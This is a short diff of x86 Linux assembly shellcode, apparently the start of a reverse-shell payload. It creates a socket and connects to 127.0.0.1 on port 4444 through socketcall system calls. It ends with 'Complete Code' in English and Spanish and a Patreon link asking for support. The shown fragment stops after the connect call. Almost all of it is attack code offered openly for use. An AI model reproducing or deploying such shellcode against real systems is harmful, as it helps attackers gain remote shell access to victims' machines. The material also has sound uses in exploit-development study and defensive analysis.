@@ -6,7 +6,7 @@ _start:
 
 xor esi, esi
 
-mov al, 0x66
+mov al, 102
 inc esi
 push esi
 pop ebx
@@ -20,15 +20,11 @@ push esi
 
 mov ecx, esp
 
-xor esi, esi
-push esi
-pop edx
-
 int 0x80
 
 xchg edx, eax
 
-mov al, 0x66
+mov al, 102
 
 push 0x0100007f
 push word 0x5c11
@@ -36,6 +32,18 @@ push word 0x2
 
 mov ecx, esp
 
+
+push 0x10
+push ecx
+push edx
+
+mov ecx, esp
+
+mov bl, 0x3
+
+int 0x80
+
+Complete Code.
 Código completo.
 https://www.patreon.com/BGPavelAng
 Ayudame a seguir haciendo más de esto.
